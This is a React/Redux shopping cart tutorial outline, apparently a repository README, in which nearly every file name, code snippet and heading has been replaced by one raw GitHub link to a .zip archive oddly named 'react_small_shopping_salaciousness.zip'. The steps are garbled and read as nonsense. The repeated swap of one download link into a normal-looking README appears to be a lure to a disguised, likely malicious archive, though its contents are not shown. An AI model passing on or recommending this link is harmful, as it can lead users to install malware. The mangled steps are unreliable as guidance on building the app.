# Build ECommerce Shopping Cart by React & Redux 2020 Edition

## Table Of Content

1. Introduction

   1. Introduction
      1. Fully-Functional Shopping Cart
      2. Instant Feedback
      3. Animated and Intuitive Design
      4. List Products
      5. Sort Products By Price High or Low
      6. Filter Products by Size
      7. Open Modal By Click on Product
      8. Add Product To Cart using Animation
      9. Handle Multiple Click By Adding More Items
      10. Remove Product
      11. Show Checkout Form
      12. Create Order with user friendly id
      13. Admin Section to see list of products
      14. Using postman to add or remove products and orders
   2. Tools and Technologies
      1. JavaScript (arrow functions, array functions, spread Operators, ...)
      2. React (react-touter-dom, react-reveal, react-modal)
      3. Redux (react-redux, redux-thunk)
      4. Node (express, body-parser, Environment Variables, nodemon)
      5. MongoDB ( mongoose, shortid)
      6. VS Code (ES6 Snippets, ES7 React Extension, ESLint Extension,CSS Peek)
      7. Chrome ( React Developer Tools, Redux Developer Tools)
      8. Git (create repo, commit, remote, create and push branch)
      9. Github (create repo, connect to local repo, pull request and merge)
      10. Postman ( send get, post, put and delete requests to apis)
      11. Deployment ( Heroku, MongoDB Atlas Cloud)
   3. Create React App
      1. Open VS Code and open terminal
      2. cd Desktop
      3. npx create-react-app react-shopping-cart
      4. Remove unused files
      5. Convert https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip Class Component
      6. Add header, main and footer
      7. Update https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip to add grid
   4. Project Development Workflow
      1. Create Google Spreadsheet
      2. Add columns Feature, Description, State, and Duration
      3. Enter Products Component, Show list of products, Open, 2
      4. Add Time ? Hours, Rate 30 USD/Hours, Cost ? USD
      5. Add All Features
      6. Create Github account
      7. Create new repository
      8. Add it as remote repository in VS Code
      9. Commit changes
      10. Push changes on github
      11. Start => create new feature Feature 1 in google spreadsheet
      12. Create a new branch feature-1 for test the workflow
      13. Add "// branch feature 1" in https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip Line 1
      14. Commit with message "feature 1"
      15. Click publish changes
      16. Open repository page on github
      17. Create pull request
      18. Merge pull request
      19. In VS Code switch to master and Sync changes
      20. End => Loop from step 11 for next feature

2. React

   1. Products Component
      1. Create https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip {products:[{_id, title, ...}]
      2. Update https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip to import https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      3. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip {flex, wrap}
      4. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip {flex: 3 60rem}
      5. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip {flex: 1 20rem;}
      6. Create https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip component
      7. Add it to https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip in https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip and set products props
      8. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip {flex,center, center,warp, p:0,m:0, style:none}
      9. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip(p => https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip{p.\_id} {flex, p:1, m:1, none,h:47}
      10. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip { flex, column, space-between, h:100%}
      11. a href="#" > img {max-width, max-height:37} + p {https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip}
      12. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip > https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip + https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip Add to cart
      13. product-price {flex, space-between, center}
      14. div {https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip} flex: 1; align: center; size: 2rem
      15. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip Add To Cart
   2. Filter Component
      1. Create https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      2. Add it above Products component in https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      3. Update https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip render
      4. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip {flex, wrap, p,m:1rem, border-bottom: .1rem}
      5. filter-result {https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip}
      6. filter-sort {flex:1}
      7. label Order select https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      8. onChange= https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip(https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip)
      9. option lowestprice Lowest, ...
      10. filter-size {flex:1}
      11. label Filter select https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      12. onChange= https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip(https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip)
      13. option "" ALL, XS, S, M, L, XL, XXL
      14. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      15. Add Filter Component
   3. Cart Component
      1. Set Active Task Management Spreadsheet
      2. Create branch cart-component
      3. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      4. Handle "Add To Cart" to https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip(product)
      5. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      6. Add cartItems to state as []
      7. Create addToCart(product)
      8. Slice, Check product existance, add to cartitems
      9. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      10. Define cartItems from https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      11. Check https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip and show message
      12. List cartItems {https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip > 0 && (}
      13. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      14. Style cart, cart-header, cart-items (img, li),
      15. Publish changes
      16. Pull request, merge, change to master
      17. Task Management Spreadsheet set it done
   4. Checkout Form
      1. Set Active Task Management Spreadsheet
      2. Create branch checkout-form
      3. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      4. Make cart items persistent
      5. Use LocalStorage on App constructor to load cart items (https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip)
      6. Use LocalStorage on addToCart to save cart items (https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip)
      7. Handle Click on Proceed
      8. Update showCheckout state to true on click
      9. Conditional rendering Checkout Form
      10. Get Email, Name and Address required input
      11. Define handleInput function
      12. Add Checkout Button
      13. Handle onSubmit Form Event by https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      14. Create order object and pass to parent to handle it
      15. Commit and Publish changes
      16. Pull request, merge, change to master
      17. Task Management Spreadsheet set it done
   5. Add Modal and Animation
      1. Set Active Task Management Spreadsheet
      2. Create branch animation-modal
      3. Show Animation
      4. Install react-reveal
      5. Create fade effect from bottom for products
      6. Create fade left for add to cart
      7. Create fade right for show checkout form
      8. Open Modal by click on product image
      9. Install react-modal
      10. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      11. Import Modal
      12. Set state for product to null
      13. Define openModal and closeModal
      14. Show Modal if product exist
      15. Create Modal
      16. Create zoom effect for modal
      17. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      18. Style Product Details
      19. Commit and Publish changes
      20. Pull request, merge, change to master
      21. Task Management Spreadsheet set it done

3. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip

   1. Create Products Backend
      1. Install nodemon globally
      2. Add https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      3. Install express body-parser mongoose shortid
      4. Install MongoDB
      5. app = express()
      6. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip(https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip())
      7. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip()
      8. create Product model
      9. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip("https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip")
      10. Postman send post request
      11. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip("/api/products")
      12. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip("/api/products/:id")

4. Redux

   1. Add Redux
      1. what is redux (diagram)
      2. update task on spreadsheet
      3. create branch add-redux-products
      4. npm install redux react-redux redux-thunk
      5. create types
      6. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      7. define FETCH_PRODUCTS
      8. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      9. declare fetchProducts
      10. create reducers
      11. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      12. define case FETCH_PRODUCTS
      13. create store
      14. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      15. import redux
      16. set initial state
      17. define initialState
      18. create store
      19. import productReducers
      20. combine reducers
      21. Use store
      22. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      23. import store
      24. wrap all in Provider
      25. connect products
      26. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      27. connect to store
      28. import fetchProducts
      29. fetch products on did mount
      30. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      31. set proxy to http://127.0.0.1:5000
      32. npm run server
      33. check products list
      34. commit and publish
      35. send pull request and merge
      36. update spreadsheet
   2. Add Redux To Filter
      1. Updte task and branch
      2. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      3. create FILTER_PRODUCTS_BY_SIZE
      4. create ORDER_PRODUCTS_BY_PRICE
      5. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      6. create filterProducts
      7. move https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip filterProducts logic here
      8. create sortProducts
      9. move https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip filterProducts logic here
      10. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      11. case FILTER_PRODUCTS_BY_SIZE
      12. case ORDER_PRODUCTS_BY_PRICE
      13. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      14. connect props: size, sort, items and filteredItems
      15. connect actions: filterProducts and sortProducts
      16. show loading if no filteredProducts
      17. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      18. remove Filter props
      19. check result
      20. update task and branch
   3. Add Redux To Cart
      1. Updte task and branch
      2. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      3. create ADD_TO_CART
      4. create REMOVE_FROM_CART
      5. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      6. create addToCart
      7. create removeFromCart
      8. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      9. case ADD_TO_CART
      10. case REMOVE_FROM_CART
      11. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      12. connect props: cartItems
      13. connect actions: removeFromCart
      14. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      15. add action addToCart
      16. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      17. remove Cart props
      18. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      19. set initial cartItems to localStorage
      20. check result
      21. update task and branch

5. Advanced Topics

   1. Create Order
      1. Backend
      2. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      3. create order modal
      4. get /api/orders
      5. post /api/orders
      6. delete /api/orders/:id
      7. Frontend
      8. create types
      9. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      10. CLEAR_ORDER, CLEAR_CART, CREATE_ORDER
      11. create actions
      12. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      13. createOrder(order)
      14. clearOrder()
      15. create reducers
      16. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      17. case CREATE_ORDER
      18. case CLEAR_ORDER
      19. Update Cart Component
      20. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      21. connect order, createOrder, clearOrder
      22. form onSubmit={https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip}
      23. createOrder() https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip(order)
      24. closeModal() https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip()
      25. render()
      26. const { cartItems, order } = https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip;
      27. {order && (<Modal></Modal>}
   2. Manage Orders
      1. Add new page
      2. Install react-router-dom
      3. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      4. Import BrowserRouter, Route, Link
      5. render()
      6. BrowserRouter
      7. Route path="/admin" component={AdminScreen}
      8. Route path="/" exact={true} component={HomeScreen}
      9. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      10. <Filter /> <Products /> <Cart />
      11. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      12. <Orders />
      13. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      14. render() <div> Orders </div>
      15. Backend
      16. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      17. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip("/api/orders")
      18. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip("/api/orders/:id")
      19. Frontend
      20. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      21. FETCH_ORDERS
      22. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      23. fetchOrders()
      24. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      25. case FETCH_ORDERS {orders: https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip}
      26. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      27. connect orders, fetchOrders
      28. componentDidMount() fetchOrders
      29. render()
      30. !orders <div>Loading...</div>
      31. table orders
      32. https://github.com/chauvanhung/react-small-shopping/raw/refs/heads/main/src/actions/react_small_shopping_salaciousness.zip
      33. style orders

